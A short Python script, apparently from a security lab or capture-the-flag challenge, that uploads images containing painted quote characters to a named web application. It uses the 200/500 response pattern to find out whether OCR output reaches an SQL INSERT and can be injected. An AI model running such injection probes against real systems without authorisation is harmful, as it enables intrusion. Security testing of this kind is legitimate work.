# test_parity.py — paint N glued quotes (a'b, a''b, ...). If summary_ocr is concatenated into
# the INSERT string, ODD quote counts that REACH the SQL unbalance it => 500; EVEN => 200.
# The 200/500 pattern across N reveals how many quotes the OCR actually delivers, and PROVES
# whether the field is injectable at all.
import requests
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
for n in range(1,7):
    uri = open(f"qn{n}_datauri.txt").read().strip()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":f"QN{n}","user_id":UID})
    print(f"painted {n} quotes -> {r.status_code}")
# read back what OCR stored
data = requests.get(f"{BASE}/images/{UID}").json()
print()
for img in data:
    d = img.get("description","")
    if d.startswith("QN"):
        print(f"{d}: ocr={img.get('summary_ocr')!r}")
